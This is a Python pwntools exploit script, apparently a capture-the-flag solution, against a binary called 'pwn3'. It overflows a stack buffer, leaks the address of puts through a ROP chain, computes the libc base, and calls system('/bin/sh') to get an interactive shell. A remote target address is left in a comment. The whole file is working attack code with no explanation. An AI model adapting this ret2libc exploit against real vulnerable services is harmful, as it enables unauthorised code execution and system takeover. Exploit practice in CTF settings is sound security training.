#!/usr/bin/env python
from pwn import *
from time import sleep

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw']
elf = ELF('./pwn3')
#r = process('./pwn3')
# libc = ELF('libc.so') # https://libc.blukat.me/?q=puts%3A0xf7d40b40&l=libc6_2.27-3ubuntu1_i386
libc = ELF('libc_local.so')

# r = remote('104.154.106.182', 4567)
r = process("./pwn3")

# gdb.attach(r)

sleep(2)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
padding = "A"*140

print "puts plt : @"+hex(puts_plt)
print "puts got : @"+hex(puts_got)
print "main : @"+hex(main)

#STAGE 1
print r.recv()

rop = flat([
    puts_plt,
    main,
    puts_got
])

payload = padding + rop
r.writeline(payload)

# Get leak of puts in libc
leak = r.recv(4)
puts_libc = u32(leak)
print "puts@libc: 0x%x" % puts_libc
print r.recv()

##STAGE 2
#Use the leak to shell.
libc_base = puts_libc - libc.symbols['puts']
system = libc_base + libc.symbols['system']

rop = flat([
    system,
    main,
    libc_base + libc.search("/bin/sh\x00").next()
])
padding = "A"*132
payload = padding + rop

#Shell
r.writeline(payload)
r.interactive()